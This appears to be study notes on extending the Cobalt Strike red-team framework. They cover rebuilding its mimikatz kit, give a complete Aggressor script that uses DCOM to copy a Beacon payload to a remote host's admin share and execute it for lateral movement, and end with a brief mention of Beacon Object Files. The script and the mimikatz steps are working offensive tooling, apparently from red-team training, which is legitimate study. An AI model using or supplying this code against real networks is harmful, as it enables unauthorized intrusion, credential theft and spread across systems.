# Extending Cobalt Strike Notes

## Mimikatz kit

CS is loaded with older mimikatz so we need to update with the bundles they have
in windows wsl
```
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/mimikatz
./build.sh /mnt/c/Tools/cobaltstrike/mimikatz
```

Load mimikatz.cna via the Cobalt Strike > Script Manager menu and clicking the Load button

## Jump and Remote-Exec

in this example we'll integrat Invoke-DCOM.ps1 into jump
create new text file in visual studio and save as dcom.cnd, and put this in
```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

Make sure to load the script via the Script Manger (Cobalt Strike > Script Manager).

## Beacon Object Files

Beacon Object Files (BOFs) are a post-ex capability that allows for code execution inside the Beacon host process




